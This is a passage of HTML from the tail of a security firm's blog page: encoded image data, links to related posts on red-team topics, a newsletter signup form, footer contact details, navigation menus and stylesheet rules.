AHolgEYAAAAAIAW6QED0CUNYAAAAAAAWqUHDEB3fAEMAAAAAECr9IAB6I4BGAAAAACAlukBA9AVAzAAAAAAAK3TAwagGxrAAAAAAAD0QA8YgC74AhgAAAAAgB7oAQPQBQMwAAAAAAC90AMGoHkGYAAAAAAAeqIHDEDTNIABAAAAAOiNHjAAzfIFMAAAAAAAvRk6wH/pAQPQIgMwAAAAAAA9utQDBqBFTkADAAAAANCz65TSvf8AAFphAAYAAAAAoGd6wAA0xQloAAAAAAB6pgcMQFMMwAAAAAAA9E4PGIBmOAENAAAAAADP9IABqJ4BGAAAAAAAnukBA1A9J6ABAAAAAOCZHjAA1TMAAwAAAADACz1gAKrmBDQAAAAAALymBwxAlQzAAAAAAADwmh4wAFVyAhoAAAAAAF7TAwagSgZgAAAAAAD4OT1gAKrjBDQAAAAAABymBwxANQzAAAAAAABwmB4wANVwAhoAAAAAAA7TAwagGgZgAAAAAAD4PT1gAKrgBDQAAAAAABzvXUrps+cFQKkMwAAAAAAAcDw9YACK5gQ0AAAAAAAc778esOcFQKkMwAAAAAAAcJrLnPNHzwyAEjkBDQAAAAAA59EDBqA4BmAAAAAAADiPHjAAxXECGgAAAAAAzqMHDEBxDMAAAAAAAHA+PWAAiuIENAAAAAAAjKcHDEARDMAAAAAAADCeHjAARXACGgAAAAAAxtMDBqAIBmAAAAAAAJiGHjAAq3MCGgAAAAAApqUHDMBqDMAAAAAAADAtPWAAVuMENAAAAAAATEsPGIDVGIABAAAAAGB6esAArMIJaAAAAAAAmI8eMACLMgADAAAAAMB89IABWJQT0AAAAAAAMB89YAAWZQAGAAAAAIB56QEDsBgnoAEAAAAAYBlvU0oPnjUAczIAAwAAAADAMvSAAZidE9AAAAAAALCMoQf8ybMGYE4GYAAAAAAAWM6VHjAAc3ICGgAAAAAAlqcHDMAsDMAAAAAAALA8PWAAZuEENAAAAAAALE8PGIBZGIABAAAAAGAdesAATM4JaAAAAAAAWJceMACTMQADAAAAAMC69IABmIwT0AAAAAAAsC49YAAmYwAGAAAAAID16QEDMAknoAEAAAAAoBx6wACMYgAGAAAAAIBy6AEDMIoT0AAAAAAAUA49YABGMQADAAAAAEBZ9IABOJsT0AAAAAAAUCY9YABOZgAGAAAAAIAy6QEDcDInoAEAAAAAoExDD/hLzvnC+wHgWAZgAAAAAAAo18YIDMApDMAAAAAAAFC2SyMwAMcyAAMAAAAAQPmMwAAcxQAMAAAAAAB1GEbgrznnjfcFwK8YgAEAAAAAoB7fm8CX3hkAP2MABgAAAACAumz2XwLfem8A/F/KOWdPBQAAAAAAqvQQEe9TSjuvD4DwBTAAAAAAAFTtytfAAPzIF8AAAAAAANCG4Svg25TSvfcJ0C8DMAAAAAAAtMUQDNAxAzAAAAAAALRpGIL/jIi/NYIB+mEABgAAAACA9j1ExF1EPKaUtt43QLsMwAAAAAAA0Jfha+DtfhR+HP72hTBAOwzAAAAAAABA7Ifhp/0PgEoZgAEAAAAAAAAa8caLBAAAAAAAAGiDARgAAAAAAACgEQZgAAAAAAAAgEYYgAEAAAAAAAAaYQAGAAAAAAAAaIQBGAAAAAAAAKARBmAAAAAAAACARhiAAQAAAAAAABphAAYAAAAAAABohAEYAAAAAAAAoAUR8Q3UZSQ9qGYEbQAAAABJRU5ErkJggg=="></image> </svg>        </div>

        </div>

		<div id="div_block-31-115" class="ct-div-block"><h2 id="headline-32-115" class="ct-headline">More like this</h2><div id="div_block-34-115" class="ct-div-block"><div id="div_block-35-115" class="ct-div-block"><div id="_dynamic_list-36-115" class="oxy-dynamic-list"><div id="div_block-37-115-1" class="ct-div-block" data-id="div_block-37-115"><div id="div_block-234-115-1" class="ct-div-block" data-id="div_block-234-115"><a id="link-38-115-1" class="ct-link" href="https://shorsec.io/blog/the-path-to-da-part-2-relaying-to-the-internet-and-back/" target="_self" data-id="link-38-115"><img id="image-39-115-1" alt="" src="https://shorsec.io/wp-content/uploads/2023/09/pathtoda2.png" class="ct-image" srcset="https://shorsec.io/wp-content/uploads/2023/09/pathtoda2.png 512w, https://shorsec.io/wp-content/uploads/2023/09/pathtoda2-300x300.png 300w, https://shorsec.io/wp-content/uploads/2023/09/pathtoda2-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" data-id="image-39-115"></a><h2 id="headline-40-115-1" class="ct-headline" data-id="headline-40-115"><span id="span-41-115-1" class="ct-span" data-id="span-41-115"><a href="https://shorsec.io/blog/the-path-to-da-part-2-relaying-to-the-internet-and-back/">The Path To DA - Part 2: (Relaying) To The Internet And Back</a></span></h2><p id="text_block-42-115-1" class="ct-text-block post-excerpt" data-id="text_block-42-115"><span id="span-43-115-1" class="ct-span" data-id="span-43-115"> During this engagement, I reached Domain Admin privileges in 6 different ways. In this blog post, however, I will walk you through one of the most interesting ways of the 6 rather than going through all of them.</span><br></p></div><div id="div_block-44-115-1" class="ct-div-block" data-id="div_block-44-115"><div id="div_block-45-115-1" class="ct-div-block" data-id="div_block-45-115"><p id="text_block-48-115-1" class="ct-text-block" data-id="text_block-48-115"><span id="span-49-115-1" class="ct-span" data-id="span-49-115">11.09.2023</span></p><p id="text_block-46-115-1" class="ct-text-block" data-id="text_block-46-115"><span id="span-47-115-1" class="ct-span" data-id="span-47-115">Mor Davidovich</span></p></div><a id="link-50-115-1" class="ct-link" href="https://shorsec.io/blog/the-path-to-da-part-2-relaying-to-the-internet-and-back/" target="_self" data-id="link-50-115"><img id="image-51-115-1" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/right-arrow.svg" class="ct-image" srcset="" sizes="(max-width: 39px) 100vw, 39px" data-id="image-51-115"></a></div></div><div id="div_block-37-115-2" class="ct-div-block" data-id="div_block-37-115"><div id="div_block-234-115-2" class="ct-div-block" data-id="div_block-234-115"><a id="link-38-115-2" class="ct-link" href="https://shorsec.io/blog/dll-notification-injection/" target="_self" data-id="link-38-115"><img id="image-39-115-2" alt="" src="https://shorsec.io/wp-content/uploads/2023/08/dllnotificationinjectionblog.png" class="ct-image" srcset="https://shorsec.io/wp-content/uploads/2023/08/dllnotificationinjectionblog.png 1024w, https://shorsec.io/wp-content/uploads/2023/08/dllnotificationinjectionblog-300x300.png 300w, https://shorsec.io/wp-content/uploads/2023/08/dllnotificationinjectionblog-150x150.png 150w, https://shorsec.io/wp-content/uploads/2023/08/dllnotificationinjectionblog-768x768.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-id="image-39-115"></a><h2 id="headline-40-115-2" class="ct-headline" data-id="headline-40-115"><span id="span-41-115-2" class="ct-span" data-id="span-41-115"><a href="https://shorsec.io/blog/dll-notification-injection/">DLL Notification Injection</a></span></h2><p id="text_block-42-115-2" class="ct-text-block post-excerpt" data-id="text_block-42-115"><span id="span-43-115-2" class="ct-span" data-id="span-43-115">New “threadless” process injection technique that works by utilizing the concept of DLL Notification Callbacks in local and remote processes.</span><br></p></div><div id="div_block-44-115-2" class="ct-div-block" data-id="div_block-44-115"><div id="div_block-45-115-2" class="ct-div-block" data-id="div_block-45-115"><p id="text_block-48-115-2" class="ct-text-block" data-id="text_block-48-115"><span id="span-49-115-2" class="ct-span" data-id="span-49-115">14.08.2023</span></p><p id="text_block-46-115-2" class="ct-text-block" data-id="text_block-46-115"><span id="span-47-115-2" class="ct-span" data-id="span-47-115">Mor Davidovich</span></p></div><a id="link-50-115-2" class="ct-link" href="https://shorsec.io/blog/dll-notification-injection/" target="_self" data-id="link-50-115"><img id="image-51-115-2" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/right-arrow.svg" class="ct-image" srcset="" sizes="(max-width: 39px) 100vw, 39px" data-id="image-51-115"></a></div></div><div id="div_block-37-115-3" class="ct-div-block" data-id="div_block-37-115"><div id="div_block-234-115-3" class="ct-div-block" data-id="div_block-234-115"><a id="link-38-115-3" class="ct-link" href="https://shorsec.io/blog/the-essential-elements-of-a-successful-penetration-testing-plan/" target="_self" data-id="link-38-115"><img id="image-39-115-3" alt="" src="https://shorsec.io/wp-content/uploads/2023/08/pentest_essentials_blog.png" class="ct-image" srcset="https://shorsec.io/wp-content/uploads/2023/08/pentest_essentials_blog.png 1024w, https://shorsec.io/wp-content/uploads/2023/08/pentest_essentials_blog-300x300.png 300w, https://shorsec.io/wp-content/uploads/2023/08/pentest_essentials_blog-150x150.png 150w, https://shorsec.io/wp-content/uploads/2023/08/pentest_essentials_blog-768x768.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-id="image-39-115"></a><h2 id="headline-40-115-3" class="ct-headline" data-id="headline-40-115"><span id="span-41-115-3" class="ct-span" data-id="span-41-115"><a href="https://shorsec.io/blog/the-essential-elements-of-a-successful-penetration-testing-plan/">The Essential Elements of a Successful Penetration Testing Plan</a></span></h2><p id="text_block-42-115-3" class="ct-text-block post-excerpt" data-id="text_block-42-115"><span id="span-43-115-3" class="ct-span" data-id="span-43-115">Unlock the secrets of a foolproof penetration testing plan with our comprehensive guide. Learn the essential elements for guaranteed success.</span><br></p></div><div id="div_block-44-115-3" class="ct-div-block" data-id="div_block-44-115"><div id="div_block-45-115-3" class="ct-div-block" data-id="div_block-45-115"><p id="text_block-48-115-3" class="ct-text-block" data-id="text_block-48-115"><span id="span-49-115-3" class="ct-span" data-id="span-49-115">09.08.2023</span></p><p id="text_block-46-115-3" class="ct-text-block" data-id="text_block-46-115"><span id="span-47-115-3" class="ct-span" data-id="span-47-115">ShorSec Team</span></p></div><a id="link-50-115-3" class="ct-link" href="https://shorsec.io/blog/the-essential-elements-of-a-successful-penetration-testing-plan/" target="_self" data-id="link-50-115"><img id="image-51-115-3" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/right-arrow.svg" class="ct-image" srcset="" sizes="(max-width: 39px) 100vw, 39px" data-id="image-51-115"></a></div></div>                    
                                            
                                        
                    </div>
</div></div></div></div></section><section id="section-46-38" class=" ct-section"><div class="ct-section-inner-wrap"><div id="div_block-47-38" class="ct-div-block"><div id="div_block-48-38" class="ct-div-block"><h3 id="headline-49-38" class="ct-headline">Get informed of the latest news in cyber security</h3><p id="text_block-50-38" class="ct-text-block">Enter your email address to receive cyber security tips, techniques, and updates</p><div id="shortcode-51-38" class="ct-shortcode footer-subscribe-form"><script type="text/javascript"></script>
                <div class="gf_browser_chrome gform_wrapper gravity-theme gform-theme--no-framework" data-form-theme="gravity-theme" data-form-index="0" id="gform_wrapper_1"><div id="gf_1" class="gform_anchor" tabindex="-1"></div>
                        <div class="gform_heading">
                            <p class="gform_description"></p>
                        </div><form method="post" enctype="multipart/form-data" target="gform_ajax_frame_1" id="gform_1" action="/blog/malrdp-implementing-rouge-rdp-manually/#gf_1" data-formid="1" novalidate="">
                        <div class="gform-body gform_body"><div id="gform_fields_1" class="gform_fields top_label form_sublabel_below description_below"><div id="field_1_1" class="gfield gfield--type-email gfield--width-three-quarter gfield_contains_required field_sublabel_below gfield--no-description field_description_below hidden_label gfield_visibility_visible" data-js-reload="field_1_1"><label class="gfield_label gform-field-label" for="input_1_1">Enter your email<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class="ginput_container ginput_container_email">
                            <input name="input_1" id="input_1_1" type="email" value="" class="large" placeholder="Enter your email" aria-required="true" aria-invalid="false">
                        </div></div><div id="field_submit" class="gfield gfield--type-submit gfield--width-quarter field_sublabel_below gfield--no-description field_description_below gfield_visibility_visible" data-field-class="gform_editor_submit_container" data-field-position="inline" data-js-reload="true"><input type="submit" id="gform_submit_button_1" class="gform-button gform-button--white  button" value="Send" onclick="if(window[&quot;gf_submitting_1&quot;]){return false;}  if( !jQuery(&quot;#gform_1&quot;)[0].checkValidity || jQuery(&quot;#gform_1&quot;)[0].checkValidity()){window[&quot;gf_submitting_1&quot;]=true;}  " onkeypress="if( event.keyCode == 13 ){ if(window[&quot;gf_submitting_1&quot;]){return false;} if( !jQuery(&quot;#gform_1&quot;)[0].checkValidity || jQuery(&quot;#gform_1&quot;)[0].checkValidity()){window[&quot;gf_submitting_1&quot;]=true;}  jQuery(&quot;#gform_1&quot;).trigger(&quot;submit&quot;,[true]); }"></div></div></div>
        <div class="gform_footer before">  <input type="hidden" name="gform_ajax" value="form_id=1&amp;title=&amp;description=1&amp;tabindex=0&amp;theme=data-form-theme='gravity-theme'">
            <input type="hidden" class="gform_hidden" name="is_submit_1" value="1">
            <input type="hidden" class="gform_hidden" name="gform_submit" value="1">
            
            <input type="hidden" class="gform_hidden" name="gform_unique_id" value="">
            <input type="hidden" class="gform_hidden" name="state_1" value="WyJbXSIsImI2ZGRjMDNkM2E4NGYwMmNhZTAzYzc3NDU5Y2Q5ZTUxIl0=">
            <input type="hidden" class="gform_hidden" name="gform_target_page_number_1" id="gform_target_page_number_1" value="0">
            <input type="hidden" class="gform_hidden" name="gform_source_page_number_1" id="gform_source_page_number_1" value="1">
            <input type="hidden" name="gform_field_values" value="">
            
        </div>
                        </form>
                        </div>
		                <iframe style="display:none;width:0px;height:0px;" src="about:blank" name="gform_ajax_frame_1" id="gform_ajax_frame_1" title="This iframe contains the logic required to handle Ajax powered Gravity Forms." data-lf-form-tracking-inspected-xbp1oaenreg8edvj="true" data-lf-yt-playback-inspected-xbp1oaenreg8edvj="true" data-lf-vimeo-playback-inspected-xbp1oaenreg8edvj="true"></iframe>
		                <script>
gform.initializeOnLoaded( function() {gformInitSpinner( 1, 'https://shorsec.io/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery('#gform_ajax_frame_1').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_1');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_1').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_1').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_1').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_1').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_1').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_1').val();gformInitSpinner( 1, 'https://shorsec.io/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery(document).trigger('gform_page_loaded', [1, current_page]);window['gf_submitting_1'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}setTimeout(function(){jQuery('#gform_wrapper_1').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_1').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [1]);window['gf_submitting_1'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_1').text());}, 50);}else{jQuery('#gform_1').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger('gform_post_render', [1, current_page]);gform.utils.trigger({ event: 'gform/postRender', native: false, data: { formId: 1, currentPage: current_page } });} );} );
</script>
</div></div></div></div></section><section id="section-52-38" class=" ct-section"><div class="ct-section-inner-wrap"><div id="div_block-53-38" class="ct-div-block"><div id="div_block-54-38" class="ct-div-block"><a id="link-80-38" class="ct-link" href="https://shorsec.io/home/"><img id="image-55-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-final.png" class="ct-image" srcset="https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-final.png 1756w, https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-final-300x65.png 300w, https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-final-1024x221.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-final-768x166.png 768w, https://shorsec.io/wp-content/uploads/2023/07/shorsec-logo-final-1536x332.png 1536w" sizes="(max-width: 1756px) 100vw, 1756px"></a><div id="div_block-56-38" class="ct-div-block"><p id="text_block-57-38" class="ct-text-block">Email: <a id="span-59-38" class="ct-link-text" href="mailto:contact@shorsec.io" target="_self">contact@shorsec.io</a><br>Phone: <a id="span-64-38" class="ct-link-text" href="tel:+972502700888" target="_self">+972 50 270 0888</a></p><div id="div_block-69-38" class="ct-div-block"><a id="link-73-38" class="ct-link" href="https://www.linkedin.com/company/shorsec/" target="_blank"><img id="image-72-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/Linkedin-icon.png" class="ct-image social-icon" srcset="" sizes="(max-width: 92px) 100vw, 92px"></a><a id="link-74-38" class="ct-link" href="https://twitter.com/ShorSecLtd/" target="_blank"><img id="image-75-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/Twitter.svg" class="ct-image social-icon" srcset="" sizes="(max-width: 23px) 100vw, 23px"></a><a id="link-76-38" class="ct-link" href="https://github.com/orgs/ShorSec/" target="_blank"><img id="image-77-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/github-1.png" class="ct-image social-icon" srcset="https://shorsec.io/wp-content/uploads/2023/07/github-1.png 318w, https://shorsec.io/wp-content/uploads/2023/07/github-1-300x300.png 300w, https://shorsec.io/wp-content/uploads/2023/07/github-1-150x150.png 150w" sizes="(max-width: 318px) 100vw, 318px"></a><a id="link-78-38" class="ct-link" href="https://wa.me/972502700888" target="_blank"><img id="image-79-38" alt="" src="https://shorsec.io/wp-content/uploads/2023/07/Whatsapp.svg" class="ct-image social-icon" srcset="" sizes="(max-width: 23px) 100vw, 23px"></a></div></div></div><div id="div_block-81-38" class="ct-div-block"><div id="div_block-82-38" class="ct-div-block"><a id="text_block-84-38" class="ct-link-text" href="https://shorsec.io/services/">Services</a><nav id="_nav_menu-86-38" class="oxy-nav-menu oxy-nav-menu-dropdowns oxy-nav-menu-dropdown-arrow oxy-nav-menu-vertical"><div class="oxy-menu-toggle"><div class="oxy-nav-menu-hamburger-wrap"><div class="oxy-nav-menu-hamburger"><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div></div></div></div><div class="menu-footer-menu-services-container"><ul id="menu-footer-menu-services" class="oxy-nav-menu-list"><li id="menu-item-178" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-178"><a href="/services/#adversary-simulations">Adversary Simulation</a></li>
<li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15"><a href="/services/#penetration-testing">Penetration Testing</a></li>
<li id="menu-item-16" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-16"><a href="/services/#continuous-cyber-readiness">Continuous Cyber Readiness</a></li>
</ul></div></nav></div><div id="div_block-87-38" class="ct-div-block"><a id="text_block-88-38" class="ct-link-text" href="https://shorsec.io/trainings/">Trainings</a><nav id="_nav_menu-89-38" class="oxy-nav-menu oxy-nav-menu-dropdowns oxy-nav-menu-dropdown-arrow oxy-nav-menu-vertical"><div class="oxy-menu-toggle"><div class="oxy-nav-menu-hamburger-wrap"><div class="oxy-nav-menu-hamburger"><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div></div></div></div><div class="menu-footer-menu-trainings-container"><ul id="menu-footer-menu-trainings" class="oxy-nav-menu-list"><li id="menu-item-377" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-377"><a href="https://shorsec.io/trainings/#training">Courses</a></li>
<li id="menu-item-376" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-376"><a href="https://shorsec.io/trainings/#training">Workshops</a></li>
<li id="menu-item-375" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-375"><a href="https://shorsec.io/trainings/#private-training">Private Training</a></li>
</ul></div></nav></div><div id="div_block-91-38" class="ct-div-block"><p id="text_block-95-38" class="ct-text-block">Resources</p><nav id="_nav_menu-93-38" class="oxy-nav-menu oxy-nav-menu-dropdowns oxy-nav-menu-dropdown-arrow oxy-nav-menu-vertical"><div class="oxy-menu-toggle"><div class="oxy-nav-menu-hamburger-wrap"><div class="oxy-nav-menu-hamburger"><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div><div class="oxy-nav-menu-hamburger-line"></div></div></div></div><div class="menu-footer-menu-resources-container"><ul id="menu-footer-menu-resources" class="oxy-nav-menu-list"><li id="menu-item-865" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-865"><a href="https://shorsec.io/case-studies/">Case Studies</a></li>
<li id="menu-item-25" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-25"><a href="https://github.com/ShorSec/">Open-source tools</a></li>
<li id="menu-item-123" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-123"><a href="https://shorsec.io/blog/">Blog</a></li>
</ul></div></nav></div><a id="text_block-92-38" class="ct-link-text" href="https://shorsec.io/about/">About</a></div></div></div></section><div id="div_block-97-38" class="ct-div-block"><p id="text_block-98-38" class="ct-text-block">powered by <a id="span-100-38" class="ct-link-text" href="https://nextbracket.io/" target="_blank">nextbracket.io</a></p></div>	<!-- WP_FOOTER -->
<script>jQuery(document).on('click','a[href*="#"]',function(t){if(jQuery(t.target).closest('.wc-tabs').length>0){return}if(jQuery(this).is('[href="#"]')||jQuery(this).is('[href="#0"]')||jQuery(this).is('[href*="replytocom"]')){return};if(location.pathname.replace(/^\//,"")==this.pathname.replace(/^\//,"")&&location.hostname==this.hostname){var e=jQuery(this.hash);(e=e.length?e:jQuery("[name="+this.hash.slice(1)+"]")).length&&(t.preventDefault(),jQuery("html, body").animate({scrollTop:e.offset().top-0},1000))}});</script><!--?xml version="1.0"?--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1"><defs><symbol id="FontAwesomeicon-chevron-down" viewBox="0 0 28 28"><title>chevron-down</title><path d="M26.297 12.625l-11.594 11.578c-0.391 0.391-1.016 0.391-1.406 0l-11.594-11.578c-0.391-0.391-0.391-1.031 0-1.422l2.594-2.578c0.391-0.391 1.016-0.391 1.406 0l8.297 8.297 8.297-8.297c0.391-0.391 1.016-0.391 1.406 0l2.594 2.578c0.391 0.391 0.391 1.031 0 1.422z"></path></symbol></defs></svg>
		<script type="text/javascript">
			jQuery(document).ready(function() {
				jQuery('body').on('click', '.oxy-menu-toggle', function() {
					jQuery(this).parent('.oxy-nav-menu').toggleClass('oxy-nav-menu-open');
					jQuery('body').toggleClass('oxy-nav-menu-prevent-overflow');
					jQuery('html').toggleClass('oxy-nav-menu-prevent-overflow');
				});
				var selector = '.oxy-nav-menu-open .menu-item a[href*="#"]';
				jQuery('body').on('click', selector, function(){
					jQuery('.oxy-nav-menu-open').removeClass('oxy-nav-menu-open');
					jQuery('body').removeClass('oxy-nav-menu-prevent-overflow');
					jQuery('html').removeClass('oxy-nav-menu-prevent-overflow');
					jQuery(this).click();
				});
			});
		</script>

	<style id="wp-block-heading-inline-css">
h1.has-background,h2.has-background,h3.has-background,h4.has-background,h5.has-background,h6.has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}
</style>
<style id="wp-block-paragraph-inline-css">
.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}p.has-background{padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
</style>
<style id="wp-block-image-inline-css">
.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image figcaption{margin-bottom:1em;margin-top:.5em}.wp-block-image .is-style-rounded img,.wp-block-image.is-style-circle-mask img,.wp-block-image.is-style-rounded img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}.wp-block-image :where(.has-border-color){border-style:solid}.wp-block-image :where([style*=border-top-color]){border-top-style:solid}.wp-block-image :where([style*=border-right-color]){border-right-style:solid}.wp-block-image :where([style*=border-bottom-color]){border-bottom-style:solid}.wp-block-image :where([style*=border-left-color]){border-left-style:solid}.wp-block-image :where([style*=border-width]){border-style:solid}.wp-block-image :where([style*=border-top-width]){border-top-style:solid}.wp-block-image :where([style*=border-right-width]){border-right-style:solid}.wp-block-image :where([style*=border-bottom-width]){border-bottom-style:solid}.wp-block-image :where([style*=border-left-width]){border-left-style:solid}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;-webkit-backdrop-filter:blur(16px) saturate(180%);backdrop-filter:blur(16px) saturate(180%);background-color:rgba(90,90,90,.25);border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:center;opacity:0;padding:0;position:absolute;right:16px;text-align:center;top:16px;transition:opacity .2s ease;width:20px;z-index:100}.wp-lightbox-container button:focus-visible{outline:3px auto rgba(90,90,90,.25);outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:rgba(90,90,90,.25);border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100vw;z-index:100000}.wp-lightbox-overlay .close-button{align-items:center;cursor:pointer;display:flex;justify-content:center;min-height:40px;min-width:40px;padding:0;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .close-button:focus,.wp-lightbox-overlay .close-button:hover,.wp-lightbox-overlay .close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay .lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:9999999999}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both;visibility:visible}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.hideanimationenabled:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.hideanimationenabled:not(.active) img{animation:turn-off-visibility .25s both}@media 